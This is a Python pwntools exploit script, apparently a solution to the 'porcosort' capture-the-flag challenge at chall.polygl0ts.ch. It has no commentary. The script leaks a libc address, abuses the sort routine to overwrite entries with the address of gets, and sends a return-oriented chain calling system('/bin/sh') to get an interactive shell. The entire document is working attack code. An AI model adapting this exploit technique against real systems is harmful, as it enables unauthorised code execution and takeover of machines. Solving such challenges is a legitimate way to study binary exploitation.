#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'chall.polygl0ts.ch', 3900
binary = './porcosort_patched'
brkpts = '''
b*$rebase(0x1432)
c
b gets
c
'''

elf = ELF("porcosort")
libc = ELF("./libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(remote_ip, port)
    context.noptrace = True

elif len(sys.argv) > 1:
    io = gdb.debug(binary, brkpts)

else:
    io = process(binary)

if __name__ == "__main__":
    sa("here.\n", p64(2**63)*(0x30 // 8))
    reu("gift: ")
    libc.address = int(rl().strip(), 16) - libc.symbols['_IO_2_1_stdout_']
    log.info("libc @ "+hex(libc.address))

    sla("? ", "48")

    sla("> ", str(0x3c))
    for i in range(47 - 4):
        sla("> ", "-"+str(2**63 - i))

    sla("> ", str(libc.symbols['gets']))
    sla("> ", str(libc.symbols['gets']))
    sla("> ", str(libc.symbols['gets']))

    system = libc.symbols['system']
    binsh = libc.address + 0x1bd26a
    pop_rdi = libc.address + 0x29835
    ret = pop_rdi + 1
    payload = " " + "a"*0x10f + flat([
        pop_rdi, binsh,
        system
    ])
    sla("> ", str(libc.symbols['gets']) + payload)


    io.interactive()
